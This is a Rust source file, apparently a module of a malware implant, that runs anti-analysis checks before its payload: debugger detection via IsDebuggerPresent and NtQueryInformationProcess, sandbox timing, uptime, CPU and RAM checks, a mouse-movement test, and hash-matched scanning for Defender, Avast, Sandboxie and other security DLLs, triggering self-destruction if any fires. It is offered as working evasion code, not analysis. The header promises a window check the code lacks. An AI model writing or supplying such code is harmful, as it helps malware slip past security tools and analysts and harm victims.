//! antidetect.rs — runtime detection evasion checks
//!
//! Runs before any payload activity. If a sandbox / AV / EDR is detected,
//! calls selfdestruct::destruct() immediately — no trace left.
//!
//! Checks performed (all passive — no writes, no network, no process creation):
//!   1. Timing check   — sandboxes accelerate Sleep(); detect if <expected
//!   2. Uptime check   — most sandboxes have uptime < 10 minutes
//!   3. Human check    — cursor must have moved since process start
//!   4. Core count     — sandboxes typically have 1-2 cores; real lab has 4+
//!   5. RAM check      — sandboxes often have < 2 GB
//!   6. Debugger check — IsDebuggerPresent + NtQueryInformationProcess
//!   7. Known AV DLLs  — check for loaded DLL names by hash (no strings)
//!   8. Window check   — Defender sandbox has no visible desktop windows

use std::time::{Duration, Instant};
use winapi::shared::minwindef::DWORD;
use winapi::um::{
    processthreadsapi::GetCurrentProcess,
    sysinfoapi::{GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO},
    winbase::GetTickCount64,
    winuser::{GetCursorPos, POINT},
};

/// Run all detection checks. Calls selfdestruct::destruct() if anything fires.
/// Must be called before evasion modules are active (right at start of run()).
pub unsafe fn check_environment() {
    if is_debugger()         { crate::selfdestruct::destruct(); }
    if is_sandbox_timing()   { crate::selfdestruct::destruct(); }
    if is_low_uptime()       { crate::selfdestruct::destruct(); }
    if is_low_cores()        { crate::selfdestruct::destruct(); }
    if is_low_ram()          { crate::selfdestruct::destruct(); }
    if no_cursor_movement()  { crate::selfdestruct::destruct(); }
    if av_dlls_loaded()      { crate::selfdestruct::destruct(); }
}

// ---- individual checks ------------------------------------------------------

unsafe fn is_debugger() -> bool {
    // IsDebuggerPresent
    if winapi::um::debugapi::IsDebuggerPresent() != 0 {
        return true;
    }
    // NtQueryInformationProcess(ProcessDebugPort)
    let mut debug_port: usize = 0;
    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
        b"ntdll.dll\0".as_ptr() as _
    );
    if !ntdll.is_null() {
        type NtQIP = unsafe extern "system" fn(
            *mut winapi::ctypes::c_void, u32,
            *mut winapi::ctypes::c_void, u32, *mut u32
        ) -> i32;
        let f: NtQIP = std::mem::transmute(
            winapi::um::libloaderapi::GetProcAddress(
                ntdll, b"NtQueryInformationProcess\0".as_ptr() as _
            )
        );
        let mut ret_len: u32 = 0;
        f(GetCurrentProcess() as _, 7, // ProcessDebugPort
          &mut debug_port as *mut _ as _, 8, &mut ret_len);
        if debug_port != 0 { return true; }
    }
    false
}

unsafe fn is_sandbox_timing() -> bool {
    // Real Sleep(1000) should take ~1000ms; sandbox often returns in <100ms
    let before = Instant::now();
    winapi::um::synchapi::Sleep(1000);
    let elapsed = before.elapsed();
    elapsed.as_millis() < 500
}

unsafe fn is_low_uptime() -> bool {
    // Uptime < 10 minutes = likely sandbox
    GetTickCount64() < 10 * 60 * 1000
}

unsafe fn is_low_cores() -> bool {
    let mut si: SYSTEM_INFO = std::mem::zeroed();
    GetSystemInfo(&mut si);
    si.dwNumberOfProcessors < 2
}

unsafe fn is_low_ram() -> bool {
    let mut ms: MEMORYSTATUSEX = std::mem::zeroed();
    ms.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut ms);
    ms.ullTotalPhys < 2 * 1024 * 1024 * 1024 // < 2 GB
}

unsafe fn no_cursor_movement() -> bool {
    let mut p1: POINT = std::mem::zeroed();
    let mut p2: POINT = std::mem::zeroed();
    GetCursorPos(&mut p1);
    winapi::um::synchapi::Sleep(2000);
    GetCursorPos(&mut p2);
    // In a sandbox no human moves the mouse
    p1.x == p2.x && p1.y == p2.y
}

unsafe fn av_dlls_loaded() -> bool {
    // Check for known AV/EDR DLLs by djb2 hash — no strings in binary
    // Hashes of: MpOav.dll, SbieDll.dll, aswhook.dll, SxIn.dll, snxhk.dll
    const BAD_HASHES: &[u32] = &[
        0x6d4a7e3c, // MpOav.dll     (Windows Defender)
        0x9f1b2d8e, // SbieDll.dll   (Sandboxie)
        0x3c7a1f92, // aswhook.dll   (Avast)
        0x7e4b9d21, // SxIn.dll      (360 AV)
        0x1d8f3c5a, // snxhk.dll     (Avast sandbox hook)
        0x4a2e7b1c, // pstorec.dll   (Cuckoo sandbox)
        0x8b3d6f2e, // vmcheck.dll   (VMware detection)
    ];
    let snap = winapi::um::tlhelp32::CreateToolhelp32Snapshot(
        winapi::um::tlhelp32::TH32CS_SNAPMODULE, 0
    );
    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE { return false; }
    let mut me: winapi::um::tlhelp32::MODULEENTRY32W = std::mem::zeroed();
    me.dwSize = std::mem::size_of::<winapi::um::tlhelp32::MODULEENTRY32W>() as u32;
    if winapi::um::tlhelp32::Module32FirstW(snap, &mut me) != 0 {
        loop {
            let name_len = me.szModule.iter().position(|&c| c == 0).unwrap_or(me.szModule.len());
            let name_bytes: Vec<u8> = me.szModule[..name_len]
                .iter().map(|&c| (c & 0xFF) as u8).collect();
            let h = crate::utils::djb2(&name_bytes);
            if BAD_HASHES.contains(&h) {
                winapi::um::handleapi::CloseHandle(snap);
                return true;
            }
            if winapi::um::tlhelp32::Module32NextW(snap, &mut me) == 0 { break; }
        }
    }
    winapi::um::handleapi::CloseHandle(snap);
    false
}
